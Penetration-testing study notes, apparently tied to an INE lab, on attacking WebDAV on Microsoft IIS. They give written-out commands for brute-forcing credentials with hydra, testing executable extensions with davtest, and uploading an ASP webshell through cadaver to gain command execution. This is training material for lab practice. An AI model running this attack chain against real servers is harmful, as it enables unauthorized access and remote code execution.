# WebDAV Vulnerabilities

## Microsoft IIS

* IIS (Internet Information Services) is a proprietary extensible web server software developed by Microsoft for use with the Windows NT family.
* It can be used to host websites/web apps and provides administrators with a robust GUI for managing websites.&#x20;
* IIS can be used to host both static and dynamic web pages developed in ASP.NET and PHP.&#x20;
* Typically configured to run on ports 80/443.&#x20;

#### Supported executable file extensions:

* <mark style="color:blue;">.asp</mark>
* <mark style="color:blue;">.aspx</mark>
* <mark style="color:blue;">.config</mark>
* <mark style="color:blue;">.php</mark>

## WebDAV

* WebDAV (Web-based Distributed Authoring and Versioning) is a set of extensions to the HTTP protocol which allow users to collaboratively edit and manage files on remote web servers.&#x20;
* WebDAV essentially enables a web server to function as a file server for collaborative authoring.&#x20;
* WebDAV runs on top Microsoft IIS on ports 80/443.&#x20;
* In order to connect to a WebDAV server, you will need to provide legitimate credentials. This is because WebDAV implements authentication in the form of a username and password.

## WebDAV Exploitation

* The first step of the exploitation process will involve identifying whether WebDAV has been configured to run on the IIS web server.&#x20;
* We can perform a brute-force attack on the WebDAV server in order to identify legitimate credentials that we can use for authentication.&#x20;
* After obtaining legitimate credentials, we can authenticate with the WebDAV server and upload a malicious .asp payload that can be used to execute arbitrary commands or obtain a reverse shell on the target.

## Tools

*   <mark style="color:red;">davtest</mark> - Used to scan, authenticate and exploit a WebDAV server.

    * Pre-installed on most offensive penetration testing distributions like Kali and Parrot OS.&#x20;


* <mark style="color:red;">cadaver</mark> - cadaver supports file upload, download, on-screen display, inplace editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking on WebDAV servers.
  * Pre-installed on most offensive penetration testing distributions like Kali and Parrot OS.

### Commands

Use the "<mark style="color:red;">http-enum</mark>" to see if the "<mark style="color:yellow;">/webdav</mark>" directory exists.

<mark style="color:purple;">NOTE:</mark> In case it is protected by credentials perform a brute-force attack.

* <mark style="color:yellow;">"hydra -L /usr/share/wordlists/metasploit/common\_users.txt -P /usr/share/wordlists/metasploit/common\_passwords.txt 'targetIP 'http-get /webdav/</mark>"



Confirms if webdav has been configured on the webserver and tests what <mark style="color:red;">files extensions</mark> that can be executed in the server (if credentials are necessary):

* "<mark style="color:yellow;">davtest -auth bob:password\_123321 -url http://demo.ine.local/webdav</mark>"

Without credentials necessary:

* "<mark style="color:yellow;">davtest -url http://targetIP/webdav/</mark>"

Gives you a shell for you to interact with the files.

* "<mark style="color:yellow;">cadaver http://demo.ine.local/webdav</mark>"
* "<mark style="color:yellow;">put pathtofile</mark>"

Having in mind the <mark style="color:red;">file extensions</mark> that can be executed we can upload a <mark style="color:red;">reverse shell</mark> to the web server using cadaver with that same extensions.

Kali Linux comes with pre-installed webshells in the directory "<mark style="color:blue;">/usr/share/webshells/</mark>".

<mark style="color:purple;">NOTE:</mark> A webshell is in the browser.

* "<mark style="color:yellow;">put /usr/share/webshells/asp/webshell.asp</mark>"

To cat a file run:

* "<mark style="color:yellow;">type 'pathtofile'</mark>"
